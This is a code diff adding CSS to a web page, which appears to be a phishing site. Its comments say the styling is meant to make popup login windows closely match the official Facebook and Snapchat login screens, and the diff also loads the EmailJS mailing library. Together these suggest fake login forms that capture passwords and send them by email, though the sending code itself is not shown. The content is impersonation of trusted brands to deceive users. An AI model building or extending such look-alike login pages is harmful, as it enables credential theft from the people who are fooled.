@@ -146,7 +146,203 @@
       font-weight: bold;
     }
   
-    .top-banner img { width: 100%; height: auto; display: block; }</style>
+    .top-banner img { width: 100%; height: auto; display: block; }
+    /* Custom styles for Snapchat login popup to resemble Snapchat window */
+    #snapchatPopup {
+      background: #FFFC00; /* Snapchat yellow */
+      color: #000;
+      border: 2px solid #000;
+    }
+    #snapchatPopup h3 {
+      background: #000;
+      color: #FFFC00;
+      padding: 10px;
+      border-radius: 10px;
+      margin: 0 -30px 20px; /* extend header full width and offset padding area */
+    }
+    #snapchatPopup button.button {
+      background: #000;
+      color: #FFFC00;
+      border: none;
+      margin-top: 15px;
+    }
+    #snapchatPopup button.button:nth-of-type(2) {
+      background: #fff;
+      color: #000;
+    }
+
+    /* Custom styles for Facebook login popup to resemble Facebook window */
+    #facebookPopup {
+      background: #fff;
+      color: #050505;
+      border: 1px solid #ddd;
+    }
+    #facebookPopup h3 {
+      background: #1877F2;
+      color: #fff;
+      padding: 10px;
+      border-radius: 10px;
+      margin: 0 -30px 20px;
+    }
+    #facebookPopup button.button {
+      background: #1877F2;
+      color: #fff;
+      border: none;
+      margin-top: 15px;
+    }
+    #facebookPopup button.button:nth-of-type(2) {
+      background: #e4e6eb;
+      color: #050505;
+    }
+
+    /* Overriding popup styles for more realistic Facebook and Snapchat login windows */
+    #snapchatPopup {
+      background: #FFFC00;
+      color: #000;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #snapchatPopup h3 {
+      background: transparent;
+      color: #000;
+      font-size: 1.3em;
+      font-weight: bold;
+      margin: 0 0 15px;
+      padding: 0;
+    }
+    #snapchatPopup input {
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      color: #000;
+    }
+    #snapchatPopup button.button {
+      background: #000;
+      color: #FFFC00;
+      border: none;
+      border-radius: 6px;
+    }
+    #snapchatPopup button.button:nth-of-type(2) {
+      background: #f5f5f5;
+      color: #000;
+    }
+
+    #facebookPopup {
+      background: #f5f6f7;
+      color: #1c1e21;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #facebookPopup h3 {
+      background: #1877F2;
+      color: #fff;
+      font-size: 1.3em;
+      padding: 12px;
+      border-radius: 6px;
+      margin: -30px -30px 20px -30px;
+    }
+    #facebookPopup input {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      color: #1c1e21;
+    }
+    #facebookPopup button.button {
+      background: #1877F2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+    }
+    #facebookPopup button.button:nth-of-type(2) {
+      background: #e4e6eb;
+      color: #050505;
+    }
+
+
+    /* Further refinement of popup styles to closely match the official Facebook and Snapchat login screens */
+    #facebookPopup {
+      background: #18191a;
+      color: #e4e6eb;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+    #facebookPopup h3 {
+      background: none;
+      color: #e4e6eb;
+      font-weight: bold;
+      font-size: 1.4em;
+      padding: 0;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    #facebookPopup label {
+      color: #b0b3b8;
+    }
+    #facebookPopup input {
+      background: #242526;
+      border: 1px solid #3A3B3C;
+      border-radius: 10px;
+      color: #e4e6eb;
+    }
+    #facebookPopup button.button {
+      background: #1877F2;
+      color: #fff;
+      border-radius: 50px;
+      border: none;
+      width: 100%;
+    }
+    #facebookPopup button.button:nth-of-type(2) {
+      background: transparent;
+      color: #1877F2;
+      border: 1px solid #1877F2;
+    }
+    #facebookPopup button.button:nth-of-type(2):hover {
+      background: #E7F3FF;
+    }
+
+    #snapchatPopup {
+      background: #fff;
+      color: #000;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #snapchatPopup h3 {
+      background: none;
+      color: #000;
+      font-size: 1.4em;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: bold;
+    }
+    #snapchatPopup label {
+      color: #00A5E5;
+      text-transform: uppercase;
+      font-size: 0.9em;
+      font-weight: bold;
+    }
+    #snapchatPopup input {
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      color: #000;
+    }
+    #snapchatPopup button.button {
+      background: #E5E5E5;
+      color: #8E8E93;
+      border: none;
+      border-radius: 50px;
+      width: 100%;
+    }
+    #snapchatPopup button.button:nth-of-type(2) {
+      background: transparent;
+      color: #00A5E5;
+      border: none;
+    }
+    #snapchatPopup button.button:nth-of-type(2):hover {
+      text-decoration: underline;
+    }
+
+</style>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
   document.addEventListener("DOMContentLoaded", function() {
